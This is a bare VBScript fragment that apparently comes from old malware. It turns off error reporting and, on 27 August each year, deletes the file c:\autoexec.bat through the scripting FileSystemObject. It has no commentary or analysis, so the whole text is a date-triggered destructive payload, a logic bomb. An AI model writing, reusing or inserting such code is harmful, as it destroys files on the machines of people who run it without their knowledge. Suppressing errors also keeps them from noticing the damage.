ON ERROR RESUME NEXT
Set Alex= CreateObject("scripting.filesystemobject")
If month(date) =            8             and day(date) =             27            then
Alex.deletefile ("c:\autoexec.bat")
End If
